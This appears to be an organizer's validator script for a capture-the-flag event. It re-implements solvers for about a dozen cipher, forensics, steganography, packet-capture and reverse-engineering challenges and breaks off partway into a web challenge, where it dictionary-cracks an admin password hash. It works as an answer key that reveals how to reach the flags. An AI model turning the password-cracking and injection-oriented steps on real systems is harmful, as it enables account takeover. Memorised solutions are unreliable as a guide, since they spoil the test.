#!/usr/bin/env python3
"""FLAG THEFT AUTO - black-box validator for the rebuilt 25 challenges.

Independence: this script reads ONLY the participant-facing artifacts in
``challenges/<LEVEL>/<CID>/`` plus the private manifest (for the expected flag
and file inventory).  It deliberately does NOT import ``lib_fta`` and never
reads its ``FLAGS`` dict; every decoder/attack below is re-implemented from
scratch so a green run means the challenge is solvable from the shipped files.

Run:
    python organizer_private/validate_challenges.py
"""
import base64
import csv
import gzip
import hashlib
import hmac
import io
import json
import math
import os
import queue
import re
import shutil
import sqlite3
import struct
import subprocess
import sys
import tempfile
import threading
import time
import zipfile
import zlib
from pathlib import Path

sys.dont_write_bytecode = True  # keep participant trees pristine (no __pycache__)

from PIL import Image  # noqa: E402
from Crypto.Cipher import AES  # noqa: E402
from Crypto.Hash import SHA256  # noqa: E402
from Crypto.Protocol.KDF import PBKDF2  # noqa: E402
from Crypto.Util.Padding import unpad  # noqa: E402
import networkx as nx  # noqa: E402
import numpy as np  # noqa: E402
from networkx.algorithms.isomorphism import GraphMatcher  # noqa: E402

ROOT = Path(__file__).resolve().parents[1]
MANIFEST = ROOT / "organizer_private" / "CTFD_IMPORT" / "manifest.json"
MAN = json.loads(MANIFEST.read_text(encoding="utf-8"))["challenges"]
FL = {c["id"]: c["flag"] for c in MAN}
DIR = {c["id"]: (ROOT / c["directory"]) for c in MAN}
RESULTS = []


def part(cid: str) -> Path:
    return DIR[cid]


def _record(cid, flag, method):
    assert re.fullmatch(r"FTA\{[a-z0-9_]+\}", flag), f"{cid}: bad flag shape {flag!r}"
    assert flag == FL[cid], f"{cid}: derived {flag!r} != manifest secret"
    RESULTS.append({"id": cid, "result": "PASS", "derived_flag": flag, "method": method})
    print(f"PASS {cid}  {method}")


# ---------------------------------------------------------------------------
# E01 - custom base-41 + modular CSV filter
# ---------------------------------------------------------------------------
BASE41 = "0123456789abcdefghijklmnopqrstuvwxyz_!@#$"


def b41_decode(s):
    v = 0
    for ch in s:
        v = v * len(BASE41) + BASE41.index(ch)
    return v.to_bytes((v.bit_length() + 7) // 8, "big")


def _e01_unpermute(text, k, m):
    ki = pow(k, -1, len(BASE41))
    return "".join(BASE41[(ki * (BASE41.index(ch) - m)) % len(BASE41)] for ch in text)


def solve_e01():
    rows = list(csv.DictReader((part("E01") / "dispatch.csv").open(newline="")))
    # dual congruence gate: keep only genuine chunks
    genuine = [
        r for r in rows
        if (int(r["col_A"]) * int(r["col_B"])) % int(r["col_C"]) == 7
        and (int(r["col_A"]) + int(r["col_B"])) % int(r["col_C"]) == int(r["col_D"]) % int(r["col_C"])
    ]
    # triple-key ordering with a deterministic packet_id tie-break
    genuine.sort(key=lambda r: (int(r["col_C"]) % 5, int(r["col_D"]) % 2,
                                -int(r["col_E"]), r["packet_id"]))
    plain = bytearray()
    for r in genuine:
        k = 1 + (int(r["col_A"]) % 40)
        m = int(r["col_D"]) % 41
        plain += b41_decode(_e01_unpermute(r["payload"], k, m))
    assert bytes(plain[:2]) == b"\x1b\x13", bytes(plain[:2])
    flag = bytes(plain[2:]).decode()
    _record("E01", flag, f"dual-congruence filter + affine-unpermute + base-41 x{len(genuine)} rows")


# ---------------------------------------------------------------------------
# E02 - dual checksum gate + columnar-transpose/affine two-stage cipher
# ---------------------------------------------------------------------------
E02_COP = (1, 3, 5, 7, 9, 11, 15, 17, 19, 21, 23, 25)
E02_ENGLISH_PCT = {
    "e": 12.70, "t": 9.06, "a": 8.17, "o": 7.51, "i": 6.97, "n": 6.75, "s": 6.33,
    "h": 6.09, "r": 5.99, "d": 4.25, "l": 4.03, "c": 2.78, "u": 2.76, "m": 2.41,
    "w": 2.36, "f": 2.23, "g": 2.02, "y": 1.97, "p": 1.93, "b": 1.49, "v": 0.98,
    "k": 0.77, "j": 0.15, "x": 0.15, "q": 0.10, "z": 0.07,
}
E02_COMMON = set(
    "the a an and or of to in on at by for with is are was were be been being it "
    "its as from then when before after so which who what another through along "
    "toward towards near any no not nothing up out run runs ran night shift north "
    "northern south southbound convoy signal that this these those there their "
    "have has had he she they them his her we you your our all would could should "
    "make made take took give gave one two three new old good bad long short "
    "into over under about after before more most some such than only also back "
    "again away down off still just even here will can may must".split()
)


def affine_dec(text, a, b):
    ai = pow(a, -1, 26)
    out = []
    for ch in text:
        if "a" <= ch <= "z":
            out.append(chr((ai * ((ord(ch) - 97) - b)) % 26 + 97))
        elif "A" <= ch <= "Z":
            out.append(chr((ai * ((ord(ch) - 65) - b)) % 26 + 65))
        else:
            out.append(ch)
    return "".join(out)


def _e02_columnar_dec(text, w):
    n = len(text)
    assert n % w == 0
    r = n // w
    return "".join(text[j * r + i] for i in range(r) for j in range(w))


def _e02_english_score(text):
    import collections
    words = [w.strip(".,;:!?\"'()[]") for w in text.lower().split()]
    wscore = sum(1 for w in words if w in E02_COMMON)
    letters = [c for c in text.lower() if "a" <= c <= "z"]
    n = len(letters) or 1
    cnt = collections.Counter(letters)
    chi2 = 0.0
    for ch, pct in E02_ENGLISH_PCT.items():
        exp = pct * n / 100.0
        chi2 += (cnt.get(ch, 0) - exp) ** 2 / exp
    return wscore * 1000.0 - chi2


def _e02_recover_params(sample):
    best = None
    for w in range(1, 25):
        if len(sample) % w:
            continue
        for a in E02_COP:
            for b in range(26):
                dec = _e02_columnar_dec(affine_dec(sample, a, b), w)
                s = _e02_english_score(dec)
                if best is None or s > best[0]:
                    best = (s, w, a, b)
    return best[1], best[2], best[3]


def solve_e02():
    rows = [[c.strip() for c in ln.split("|")]
            for ln in (part("E02") / "taxi_ledger.txt").read_text(encoding="utf-8").splitlines()
            if ln.strip()]
    genuine = [r for r in rows
               if hashlib.sha1(r[0].encode()).hexdigest().endswith("a3")
               and hashlib.sha256(r[1].encode()).hexdigest().startswith("4")]
    assert len(genuine) == 1, f"expected exactly one dual-gate row, got {len(genuine)}"
    payload = genuine[0][4]

    sample = (part("E02") / "frequency_sample.bin").read_bytes().decode()
    w, a, b = _e02_recover_params(sample)
    flag = _e02_columnar_dec(affine_dec(payload, a, b), w)
    _record("E02", flag, f"dual-gate row + sample-recovered width={w} affine=({a},{b})")


# ---------------------------------------------------------------------------
# E03 - ext2 deleted-file carving + relay/host-derived multi-byte mask
# ---------------------------------------------------------------------------
def _e03_log_lines(blob):
    i = blob.find(b"2026-11-20T")
    if i < 0:
        return None
    region = blob[i:i + 65536].split(b"\x00")[0]
    return region.split(b"\n")


def _e03_key_and_span(lines):
    if not lines or len(lines) < 42:
        return None, None
    line = lines[41]                                   # 42nd line (1-based)
    mh = re.search(rb"host=(\S+)", line)
    mr = re.search(rb"relay=(\d+)", line)
    ms = re.search(rb"span=(\d+)", line)
    if not (mh and mr and ms):
        return None, None
    host = mh.group(1).decode()
    relay = int(mr.group(1))
    span = int(ms.group(1))
    klen = 4 + (len(host) % 5)
    key = bytes((ord(host[i]) + ((relay >> (8 * (i % 4))) & 0xFF) + 7 * i) & 0xFF
                for i in range(klen))
    return key, span


def _e03_streams(data):
    """(consumed_length, decompressed_bytes) for every valid zlib stream."""
    out = []
    for hdr in (b"\x78\x01", b"\x78\x5e", b"\x78\x9c", b"\x78\xda"):
        start = 0
        while True:
            i = data.find(hdr, start)
            if i < 0:
                break
            start = i + 1
            d = zlib.decompressobj()
            try:
                payload = d.decompress(data[i:])
            except Exception:  # noqa: BLE001
                continue
            if not d.eof:
                continue
            consumed = len(data[i:]) - len(d.unused_data)
            out.append((consumed, payload))
    return out


def solve_e03():
    blob = (part("E03") / "safehouse.img").read_bytes()
    key, span = _e03_key_and_span(_e03_log_lines(blob))
    assert key is not None, "activity.log line 42 (relay/span/host) not found"
    unmasked = bytes(b ^ key[i % len(key)] for i, b in enumerate(blob))
    picked = [p for (c, p) in _e03_streams(unmasked) if c == span]
    assert len(picked) == 1, f"expected exactly one stash with span={span}, got {len(picked)}"
    msg = base64.b64decode(picked[0][::-1])
    flag = re.search(rb"FTA\{[a-z0-9_]+\}", msg).group(0).decode()
    _record("E03", flag, f"ext2 carve + relay/host multi-byte mask (span={span}) + b64")


# ---------------------------------------------------------------------------
# E04 - gated column-major 2-LSB + geometry/salt keystream + gzip + UTF-7
# ---------------------------------------------------------------------------
def _e04_parse_watermark(text):
    a = int(re.search(r"a=(\d+)", text).group(1))
    b = int(re.search(r"b=(\d+)", text).group(1))
    m = int(re.search(r"mod=(\d+)", text).group(1))
    t = int(re.search(r"target=(\d+)", text).group(1))
    salt = int(re.search(r"salt=0x([0-9A-Fa-f]+)", text).group(1), 16)
    return a, b, m, t, salt


def _e04_bits_to_bytes(bits):
    out = bytearray()
    for i in range(0, (len(bits) // 8) * 8, 8):
        v = 0
        for b in bits[i:i + 8]:
            v = (v << 1) | b
        out.append(v)
    return bytes(out)


def _e04_keystream(n, w, h, salt):
    seed = b"E04" + struct.pack(">HH", w, h) + struct.pack(">I", salt)
    d = hashlib.sha256(seed).digest()
    return (d * (n // len(d) + 1))[:n]


def solve_e04():
    img = Image.open(part("E04") / "camera_roll.png")
    w, h = img.size
    a, b, m, t, salt = _e04_parse_watermark(dict(getattr(img, "text", {}) or {})["watermark"])
    px = img.convert("RGB").load()
    bits = []
    for x in range(w):
        for y in range(h):
            if (a * x + b * y) % m != t:            # gated pixels only
                continue
            for c in px[x, y]:
                bits.append((c >> 3) & 1)           # MSB of the pair lives in bit 3
                bits.append((c >> 2) & 1)
    raw = _e04_bits_to_bytes(bits)
    ks = _e04_keystream(len(raw), w, h, salt)
    wrapped = bytes(x ^ y for x, y in zip(raw, ks))
    n = int.from_bytes(wrapped[:2], "big")
    flag = gzip.decompress(wrapped[2:2 + n]).decode("utf-7")
    _record("E04", flag, "gated column-major 2-LSB + geometry/salt keystream + gzip + UTF-7")


# ---------------------------------------------------------------------------
# E05 - PDF/GIF/ZIP polyglot + PBKDF2 key + AES-128-CBC + 3-table XOR
# ---------------------------------------------------------------------------
def solve_e05():
    raw = (part("E05") / "impound_dossier.pdf").read_bytes()
    assert raw[:5] == b"%PDF-", "not a PDF header"
    m = re.search(rb"/T\s*\(serial\)[^>]*?/V\s*\(([^)]*)\)", raw, re.S)
    assert m, "serial form field not found"
    serial = m.group(1).decode("latin-1")
    m = re.search(rb"Route code:\s*([A-Za-z0-9\-]+)", raw)
    assert m, "route code not found in body"
    route = m.group(1).decode("latin-1")

    z = zipfile.ZipFile(io.BytesIO(raw))
    readme = z.read("readme.txt").decode()
    salt = bytes.fromhex(re.search(r"salt\s*=\s*([0-9a-fA-F]+)", readme).group(1))
    iters = int(re.search(r"iterations\s*=\s*(\d+)", readme).group(1))

    extra = z.getinfo("vault.db.enc").extra
    i = extra.find(b"FT")
    assert i >= 0, "FT extra field missing"
    ln = struct.unpack("<H", extra[i + 2:i + 4])[0]
    iv = extra[i + 4:i + 4 + ln]
    assert len(iv) == 16, iv

    key = hashlib.pbkdf2_hmac("sha256", (serial + "|" + route).encode(), salt, iters, 16)
    db_bytes = unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(z.read("vault.db.enc")), 16)
    z.close()

    with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as tf:
        tf.write(db_bytes)
        tmp = tf.name
    try:
        con = sqlite3.connect(tmp)
        rows = con.execute(
            "SELECT o.mask_hex, r.stream_hex, s.seal_hex "
            "FROM operators o JOIN routes r ON r.token = o.token "
            "JOIN seals s ON s.token = o.token").fetchall()
        con.close()
    finally:
        os.unlink(tmp)

    flags = []
    for mask_hex, stream_hex, seal_hex in rows:
        cand = bytes(a ^ b ^ c for a, b, c in
                     zip(bytes.fromhex(mask_hex), bytes.fromhex(stream_hex), bytes.fromhex(seal_hex)))
        mm = re.search(rb"FTA\{[a-z0-9_]+\}", cand)
        if mm:
            flags.append(mm.group(0).decode())
    assert len(set(flags)) == 1, ("unexpected candidate set", flags)
    _record("E05", flags[0], "PDF/ZIP polyglot + PBKDF2 key + CBC vault + 3-table XOR")


# ---------------------------------------------------------------------------
# E06 - split DTMF burst + custom keypad + keyed XOR
# ---------------------------------------------------------------------------
E06_LOW = [697, 770, 852, 941]
E06_HIGH = [1209, 1336, 1477]
E06_DTMF = {
    (697, 1209): "1", (697, 1336): "2", (697, 1477): "3",
    (770, 1209): "4", (770, 1336): "5", (770, 1477): "6",
    (852, 1209): "7", (852, 1336): "8", (852, 1477): "9",
    (941, 1209): "*", (941, 1336): "0", (941, 1477): "#",
}


def _e06_segments(samples, sr):
    a = np.abs(samples)
    win = max(1, int(round(0.005 * sr)))
    env = np.convolve(a, np.ones(win) / win, mode="same")
    thr = max(500.0, 0.10 * float(env.max()))
    active = env > thr
    segs, i, n = [], 0, len(active)
    while i < n:
        if active[i]:
            j = i
            while j < n and active[j]:
                j += 1
            segs.append((i, j))
            i = j
        else:
            i += 1
    return segs


def _e06_digit(seg, sr):
    x = seg.astype(np.float64)
    x = x - x.mean()
    spec = np.abs(np.fft.rfft(x * np.hanning(len(x))))
    freqs = np.fft.rfftfreq(len(x), 1.0 / sr)

    def peak(lo, hi):
        m = (freqs >= lo) & (freqs <= hi)
        return float(freqs[m][int(np.argmax(spec[m]))])

    lo = min(E06_LOW, key=lambda f: abs(f - peak(600, 1000)))
    hi = min(E06_HIGH, key=lambda f: abs(f - peak(1150, 1700)))
    return E06_DTMF[(lo, hi)]


def solve_e06():
    import wave
    with wave.open(str(part("E06") / "payphone.wav"), "rb") as w:
        sr, n = w.getframerate(), w.getnframes()
        samples = np.frombuffer(w.readframes(n), dtype="<i2").astype(np.int32)
    segs = _e06_segments(samples, sr)
    assert segs, "no DTMF tones detected"
    merge = int(round(0.25 * sr))
    blocks, cur = [], [segs[0]]
    for s in segs[1:]:
        if s[0] - cur[-1][1] < merge:
            cur.append(s)
        else:
            blocks.append(cur)
            cur = [s]
    blocks.append(cur)
    digits = ["".join(_e06_digit(samples[a:b], sr) for a, b in blk) for blk in blocks]
    assert len(digits) == 3, ("expected handshake/code/payload blocks", digits)
    # TRAP #2: leading handshake block is filler and must be dropped.
    code_digits, payload_digits = digits[1], digits[2]

    text = (part("E06") / "EXCHANGE.txt").read_text(encoding="utf-8")
    rows = {int(m.group(1)): m.group(2) + m.group(3) + m.group(4)
            for m in re.finditer(r"^\s*key\s*(\d)\s*:\s*(\S)\s+(\S)\s+(\S)\s*$", text, re.M)}
    assert len(rows) == 10, "keypad table not parsed"
    keypad = "".join(rows[k] for k in range(10))
    word = "".join(keypad[int(code_digits[i]) * 3 + int(code_digits[i + 1])]
                   for i in range(0, len(code_digits), 2))
    assert len(word) == 3, word

    ks = hashlib.sha256(word.encode() + b"payphone").digest()
    num = int(payload_digits)
    raw = num.to_bytes(max(1, (num.bit_length() + 7) // 8), "big")
    flag = None
    for pad in range(3):  # tolerate a lost leading zero byte
        x = bytes(c ^ ks[i % 32] for i, c in enumerate(b"\x00" * pad + raw))
        try:
            out = zlib.decompress(x).decode("ascii")
        except Exception:  # noqa: BLE001
            continue
        m = re.search(r"FTA\{[a-z0-9_]+\}", out)
        if m:
            flag = m.group(0)
            break
    _record("E06", flag, "split DTMF burst (drop handshake) + custom keypad + keyed XOR/inflate")


# ---------------------------------------------------------------------------
# E07 - hue-keyed Vigenere over a rail fence
# ---------------------------------------------------------------------------
def _e07_vigenere_decrypt(text, key):
    ks = [ord(c.lower()) - 97 for c in key if c.isalpha()]
    assert ks, "empty keyword"
    out, ki = [], 0
    for ch in text:
        if "a" <= ch <= "z":
            out.append(chr((ord(ch) - 97 - ks[ki % len(ks)]) % 26 + 97))
            ki += 1
        elif "A" <= ch <= "Z":
            out.append(chr((ord(ch) - 65 - ks[ki % len(ks)]) % 26 + 65))
            ki += 1
        else:
            out.append(ch)
    return "".join(out)


def _e07_rail_decode(text, rails):
    if rails <= 1 or rails >= len(text):
        return text
    n = len(text)
    pattern, rail, direction = [], 0, 1
    for _ in range(n):
        pattern.append(rail)
        if rail == 0:
            direction = 1
        elif rail == rails - 1:
            direction = -1
        rail += direction
    counts = [0] * rails
    for r in pattern:
        counts[r] += 1
    rails_txt, idx = [], 0
    for r in range(rails):
        rails_txt.append(text[idx:idx + counts[r]])
        idx += counts[r]
    pos, out = [0] * rails, []
    for r in pattern:
        out.append(rails_txt[r][pos[r]])
        pos[r] += 1
    return "".join(out)


def solve_e07():
    import colorsys
    poster = part("E07") / "wanted_poster.png"
    note = (part("E07") / "DEPUTIZE.txt").read_text(encoding="utf-8")
    img = Image.open(poster)
    V = dict(getattr(img, "text", {}) or {})["ciphertext"]
    rgb = Image.open(poster).convert("RGB")
    W, H = rgb.size
    px = rgb.load()

    def colorful(c):
        return max(c) >= 120 and (max(c) - min(c)) >= 80

    best_row, best = None, -1
    for y in range(int(H * 0.70), int(H * 0.98)):
        cnt = sum(1 for x in range(W) if colorful(px[x, y]))
        if cnt > best:
            best, best_row = cnt, y
    assert best_row is not None and best > 0, "seal row not found"
    letters, x = [], 0
    while x < W:
        if colorful(px[x, best_row]):
            x0 = x
            while x < W and colorful(px[x, best_row]):
                x += 1
            if x - x0 >= 12:
                cx = (x0 + x - 1) // 2
                r, g, b = px[cx, best_row]
                h, _, _ = colorsys.rgb_to_hsv(r / 255, g / 255, b / 255)
                letters.append(chr(ord("a") + int(h * 26) % 26))
        else:
            x += 1
    assert letters, "no seal swatches detected"
    key = "".join(letters)

    m = re.search(r"RAIL\s*COUNT\s*[:=]\s*(\d+)", note, re.I)
    assert m, "rail count not found in DEPUTIZE.txt"
    flag = _e07_rail_decode(_e07_vigenere_decrypt(V, key), int(m.group(1)))
    _record("E07", flag, "seal-hue keyword + Vigenere + rail-fence decode")


# ---------------------------------------------------------------------------
# E08 - custom UDP sessions + CRC gate + keyed XOR
# ---------------------------------------------------------------------------
E08_MAGIC_GENUINE = 0xE1D0
E08_PORT_CONTROL = 4444


def _e08_crc16(data: bytes) -> int:
    crc = 0xFFFF
    for b in data:
        crc ^= b << 8
        for _ in range(8):
            crc = ((crc << 1) ^ 0x1021) & 0xFFFF if crc & 0x8000 else (crc << 1) & 0xFFFF
    return crc


def _e08_rot13(text: str) -> str:
    out = []
    for ch in text:
        if "a" <= ch <= "z":
            out.append(chr((ord(ch) - 97 + 13) % 26 + 97))
        elif "A" <= ch <= "Z":
            out.append(chr((ord(ch) - 65 + 13) % 26 + 65))
        else:
            out.append(ch)
    return "".join(out)


def _e08_key(frag: bytes) -> bytes:
    return bytes.fromhex(_e08_rot13(base64.b64decode(frag).decode("ascii")))


def _e08_udp(eth: bytes):
    assert eth[12:14] == b"\x08\x00", "not IPv4"
    ip = eth[14:]
    ihl = (ip[0] & 0x0F) * 4
    assert ip[9] == 17, "not UDP"
    sport, dport, ulen, _csum = struct.unpack("!HHHH", ip[ihl:ihl + 8])
    return sport, dport, ip[ihl + 8:ihl + ulen]


def solve_e08():
    raw = (part("E08") / "dead_drop.pcap").read_bytes()
    magic = struct.unpack_from("<I", raw, 0)[0]
    assert magic == 0xA1B2C3D4, "not a classic little-endian pcap"
    frames, off = [], 24
    while off + 16 <= len(raw):
        _a, _b, incl, _c = struct.unpack_from("<IIII", raw, off)
        off += 16
        frames.append(raw[off:off + incl])
        off += incl

    sessions = {}
    for eth in frames:
        if len(eth) < 14 or eth[12:14] != b"\x08\x00":
            continue
        _sport, dport, payload = _e08_udp(eth)
        if len(payload) < 8:
            continue
        m, session, seq, crc, frag = struct.unpack("!HHHH", payload[:8]) + (payload[8:],)
        if m != E08_MAGIC_GENUINE:
            continue
        ent = sessions.setdefault(session, {"ctrl": None, "frags": {}})
        if dport == E08_PORT_CONTROL:
            ent["ctrl"] = frag
        elif _e08_crc16(frag) == crc:
            ent["frags"][seq] = frag

    flag = None
    for session, ent in sorted(sessions.items()):
        if ent["ctrl"] is None:
            continue
        try:
            key = _e08_key(ent["ctrl"])
            ciphertext = b"".join(ent["frags"][i] for i in sorted(ent["frags"]))
            ks = (hashlib.sha256(key).digest() * (len(ciphertext) // 32 + 1))[:len(ciphertext)]
            text = zlib.decompress(bytes(a ^ b for a, b in zip(ciphertext, ks))).decode("ascii")
        except (zlib.error, ValueError, KeyError):  # noqa: BLE001
            continue
        mm = re.search(r"FTA\{[a-z0-9_]+\}", text)
        if mm:
            flag = mm.group(0)
            break
    _record("E08", flag, "select genuine session (control-keyed) + CRC + keyed XOR/inflate")


# ---------------------------------------------------------------------------
# E09 - obfuscated JS checker (rotated array + xorshift32 PRNG)
# ---------------------------------------------------------------------------
E09_SEED_XOR = 0xA5A5F00D


def _e09_xorshift32(seed: int, n: int) -> bytes:
    x = seed & 0xFFFFFFFF
    out = bytearray()
    for _ in range(n):
        x ^= (x << 13) & 0xFFFFFFFF
        x ^= (x >> 17)
        x ^= (x << 5) & 0xFFFFFFFF
        x &= 0xFFFFFFFF
        out.append(x & 0xFF)
    return bytes(out)


def solve_e09():
    js = (part("E09") / "chopshop.js").read_text(encoding="utf-8")
    m = re.search(r"var\s+_0x4b1d\s*=\s*\[(.*?)\];", js, re.S)
    assert m, "string array not found"
    raw = re.findall(r'"([^"]*)"', m.group(1))
    m = re.search(r"\}\)\s*\(\s*_0x4b1d\s*,\s*(\d+)\s*\)", js)
    assert m, "rotation amount not found"
    rot = int(m.group(1))
    n = len(raw)
    rotated = [raw[(i + rot) % n] for i in range(n)]
    target = bytes.fromhex(rotated[4])
    seed = (int(rotated[1], 16) ^ E09_SEED_XOR) & 0xFFFFFFFF
    flag = base64.b64decode(bytes(a ^ b for a, b in zip(target, _e09_xorshift32(seed, len(target))))).decode("ascii")
    _record("E09", flag, "un-rotate JS array + unmask seed + xorshift32 key + base64")


# ---------------------------------------------------------------------------
# E10 - custom stack-VM bytecode (corrected opcode table + full XOR decode)
# ---------------------------------------------------------------------------
E10_MAGIC = b"VMB1"
E10_DECOY = "FTA{1gn1t10n_1mm0b1l1z3r_b41t}"
(OP_PUSH, OP_XOR, OP_ADD, OP_ROT, OP_DUP, OP_DROP, OP_PRINT, OP_HALT) = range(8)


def _e10_fnv1a(b: bytes) -> int:
    h = 2166136261
    for x in b:
        h = ((h ^ x) * 16777619) & 0xFFFFFFFF
    return h


def _e10_rol8(v: int) -> int:
    return ((v << 1) | (v >> 7)) & 0xFF


def solve_e10():
    raw = (part("E10") / "ignition.vmb").read_bytes()
    assert raw[:4] == E10_MAGIC, "not a VMB1 module"
    opkey = raw[4]

    def mb(b):
        return b ^ opkey

    # CORRECT table: 0x60=XOR, 0x61=ADD (YARD_NOTES swaps them -> trap gate)
    table = {0x10: OP_PUSH, 0x60: OP_XOR, 0x61: OP_ADD, 0x70: OP_ROT,
             0x80: OP_DUP, 0x81: OP_DROP, 0xA0: OP_PRINT, 0xF0: OP_HALT}
    # CORRECT encoding: header, opcodes and operands are all XORed with OPKEY
    const = bytes(mb(x) for x in raw[5:9])
    check = int.from_bytes(bytes(mb(x) for x in raw[9:13]), "big")
    blen = min(int.from_bytes(bytes(mb(x) for x in raw[13:15]), "big"), len(raw) - 15)
    code = raw[15:15 + blen]
    assert _e10_fnv1a(const) == check, "integrity gate failed on the corrected decode"

    st, out, ip = [], bytearray(), 0
    while ip < len(code):
        op = table.get(mb(code[ip]))
        ip += 1
        if op == OP_PUSH:
            st.append(mb(code[ip]))
            ip += 1
        elif op == OP_XOR:
            b = st.pop() if st else 0
            a = st.pop() if st else 0
            st.append((a ^ b) & 0xFF)
        elif op == OP_ADD:
            b = st.pop() if st else 0
            a = st.pop() if st else 0
            st.append((a + b) & 0xFF)
        elif op == OP_ROT:
            st.append(_e10_rol8(st.pop() if st else 0))
        elif op == OP_DUP:
            st.append(st[-1] if st else 0)
        elif op == OP_DROP:
            if st:
                st.pop()
        elif op == OP_PRINT:
            out.append(st.pop() if st else 0)
        elif op == OP_HALT:
            break
        else:
            break
    flag = bytes(out).decode("latin-1").strip()
    assert flag != E10_DECOY, "hit the decoy (naive) VM path"
    _record("E10", flag, "corrected VM opcode table + full-XOR decode + FNV-1a gate")


# ---------------------------------------------------------------------------
# E11 - Ghost Relay (offline wire capture; ships ghost_relay.pcap)
# ---------------------------------------------------------------------------
# NOTE: E11 ships a static participant capture (ghost_relay.pcap) holding one
# relay burst; this solver reads that participant artifact exactly as a team's
# Wireshark would.
CRP_MAGIC = 0xCB01
CRP_SESSION_E11 = 0xC11A
CRP_SEQ_CONTROL = 0xFFFF
CRP_PORT_CTRL = 7000
CRP_PORT_A = 7001
CRP_PORT_B = 7002


def _crp_crc16(data: bytes) -> int:
    crc = 0xFFFF
    for b in data:
        crc ^= b << 8
        for _ in range(8):
            crc = ((crc << 1) ^ 0x1021) & 0xFFFF if crc & 0x8000 else (crc << 1) & 0xFFFF
    return crc


def _crp_rot13(text: str) -> str:
    out = []
    for ch in text:
        if "a" <= ch <= "z":
            out.append(chr((ord(ch) - 97 + 13) % 26 + 97))
        elif "A" <= ch <= "Z":
            out.append(chr((ord(ch) - 65 + 13) % 26 + 65))
        else:
            out.append(ch)
    return "".join(out)


def _crp_read_pcap(path):
    raw = Path(path).read_bytes()
    assert struct.unpack_from("<I", raw, 0)[0] == 0xA1B2C3D4, "not a classic little-endian pcap"
    frames, off = [], 24
    while off + 16 <= len(raw):
        _a, _b, incl, _c = struct.unpack_from("<IIII", raw, off)
        off += 16
        frames.append(raw[off:off + incl])
        off += incl
    return frames


def _crp_udp(eth: bytes):
    assert eth[12:14] == b"\x08\x00", "not IPv4"
    ip = eth[14:]
    ihl = (ip[0] & 0x0F) * 4
    assert ip[9] == 17, "not UDP"
    sport, dport, ulen, _csum = struct.unpack("!HHHH", ip[ihl:ihl + 8])
    return sport, dport, ip[ihl + 8:ihl + ulen]


def _crp_groups(frames):
    """{session: {'ctrl', 'frags', 'carriers'}} for magic-0xCB01 parcels."""
    out = {}
    for eth in frames:
        if len(eth) < 14 or eth[12:14] != b"\x08\x00":
            continue
        sport, _dport, payload = _crp_udp(eth)
        if len(payload) < 8:
            continue
        magic, session, seq, crc, frag = struct.unpack("!HHHH", payload[:8]) + (payload[8:],)
        if magic != CRP_MAGIC:
            continue
        ent = out.setdefault(session, {"ctrl": None, "frags": {}, "carriers": set()})
        if seq == CRP_SEQ_CONTROL:
            ent["ctrl"] = frag
        elif _crp_crc16(frag) == crc:
            ent["frags"][seq] = frag
            ent["carriers"].add(sport)
    return out


def _crp_decode(ctrl_frag: bytes, seq_frags: dict) -> str:
    key = bytes.fromhex(_crp_rot13(base64.b64decode(ctrl_frag).decode("ascii")))
    ciphertext = b"".join(seq_frags[i] for i in sorted(seq_frags))
    ks = (hashlib.sha256(key).digest() * (len(ciphertext) // 32 + 1))[:len(ciphertext)]
    return zlib.decompress(bytes(a ^ b for a, b in zip(ciphertext, ks))).decode("ascii")


def solve_e11():
    ref = part("E11") / "ghost_relay.pcap"
    groups = _crp_groups(_crp_read_pcap(ref))
    ent = groups[CRP_SESSION_E11]
    assert ent["ctrl"] is not None
    text = _crp_decode(ent["ctrl"], ent["frags"])
    flag = re.search(r"FTA\{[a-z0-9_]+\}", text).group(0)
    _record("E11", flag, "offline wire capture -> CRP reassembly (dual carrier) + keyed XOR/inflate")


# ---------------------------------------------------------------------------
# E12 - Relay Archive (offline dump of the SAME relay; chains back to E11)
# ---------------------------------------------------------------------------
def solve_e12():
    frames = _crp_read_pcap(part("E12") / "relay_archive.pcap")
    groups = _crp_groups(frames)
    dual = {CRP_PORT_A, CRP_PORT_B}

    # the genuine archive parcel is the only one carried across BOTH carriers
    genuine = [s for s, e in groups.items() if dual <= e["carriers"]]
    assert len(genuine) == 1, f"expected one dual-carrier parcel, got {genuine}"

    # chain: the genuine tag is the Ghost Relay (E11) capture tag
    live = _crp_groups(_crp_read_pcap(part("E11") / "ghost_relay.pcap"))
    live_tag = next(s for s, e in live.items() if e["frags"])
    assert genuine[0] == live_tag, f"archive tag 0x{genuine[0]:04X} != E11 tag 0x{live_tag:04X}"

    ent = groups[genuine[0]]
    text = _crp_decode(ent["ctrl"], ent["frags"])
    flag = re.search(r"FTA\{[a-z0-9_]+\}", text).group(0)
    _record("E12", flag, "offline archive -> dual-carrier parcel id + CRP reassembly (E11-chained)")


# ---------------------------------------------------------------------------
# M01 - honeypot crack + HMAC session gate + second-order stored SQLi + veil
# ---------------------------------------------------------------------------
M01_HASH_TAG = "fleeca-h2"
M01_VEIL_TAG = "M01-escrow-veil"
M01_HONEYPOT = "admin"


def _m01_custom_hash(password, username, salt, pepper):
    material = f"{M01_HASH_TAG}|{salt}|{password}|{username[::-1]}|{pepper}"
    return hashlib.sha256(material.encode()).hexdigest()[:20]


def _m01_rot13(text):
    return text.translate(str.maketrans(
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
        "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm"))


def _m01_unmangle(text):
    return _m01_rot13(text[::-1])


def _m01_db_secrets(db):
    con = sqlite3.connect(db)
    cfg = dict(con.execute("SELECT key, value FROM config").fetchall())
    row = con.execute("SELECT pw_salt, pw_hash FROM users WHERE username = ?",
                      (M01_HONEYPOT,)).fetchone()
    con.close()
    assert row, "honeypot account missing from fleeca.db"
    return cfg, row[0], row[1]


def solve_m01():
    src = part("M01")
    work = Path(tempfile.mkdtemp(prefix="m01_"))
    try:
        for name in ("fleeca.db", "fleeca_kiosk.py"):
            shutil.copy(src / name, work / name)
        cfg, salt, admin_hash = _m01_db_secrets(work / "fleeca.db")
        ledger = cfg["core_ledger"]

        def kiosk(*args):
            return subprocess.run([sys.executable, str(work / "fleeca_kiosk.py"), *args],
                                  capture_output=True, text=True).stdout

        admin_pw = None
        for word in (src / "common_pw.txt").read_text(encoding="utf-8").split():
            if _m01_custom_hash(word, M01_HONEYPOT, salt, cfg["server_pepper"]) == admin_hash:
                admin_pw = word
                break
        assert admin_pw, "admin password not in common_pw.txt"
